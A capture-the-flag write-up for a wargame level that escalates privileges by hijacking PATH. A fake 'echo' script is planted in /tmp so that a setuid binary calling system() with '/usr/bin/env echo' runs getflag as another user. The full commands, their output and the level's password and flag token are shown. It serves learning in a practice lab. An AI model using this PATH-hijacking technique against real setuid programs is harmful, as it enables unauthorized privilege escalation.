# level03

First binary of the climb. It politely asks to be exploited, then hands you a `$PATH` wide enough to drive a truck through :)

| | |
| --- | --- |
| **Login** | `level03` / `kooda2puivaav1idi4f57q8iq` (the flag02 token) |
| **flag03 password** | n/a (we make flag03 run our code, we never log in as them) |
| **flag03 token** | `qi0maab88jeaj46qoumi7maus` (aka the level04 password) |

## poking around

Home has a binary this time:

```bash
$ ls -l ~/level03
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

That `s` in `-rwsr-sr-x` is the whole game: it's setuid **and** setgid to flag03, so whatever it runs, it runs with flag03's identity, not ours.

## what it does

`strings` already gives it away, and IDA confirms `main` is basically one line:

```c
system("/usr/bin/env echo Exploit me");
```

It literally prints "Exploit me". So:

```bash
$ ~/level03
Exploit me
```

## the hole

`system()` runs that through `/bin/sh -c`, and `/usr/bin/env echo` means "find a program called `echo` on `$PATH` and run it". It does not say `/bin/echo`. It trusts `$PATH` to tell it what `echo` is, and `$PATH` is ours to set.

So we tell it `echo` is something else. Put a fake `echo` in a writable dir, point `$PATH` at that dir first, and the setuid binary will dutifully run our fake as flag03:

```bash
$ cd /tmp
$ printf '#!/bin/sh\ngetflag\n' > echo
$ chmod +x echo
$ PATH=/tmp:$PATH ~/level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

The binary thought it was saying "Exploit me". It was actually running `getflag` with flag03's privileges and reading us the token. Rude of it, really.

(The `echo` script in this folder is that fake. `/tmp` gets wiped periodically on this box, so just recreate it if it vanishes.)
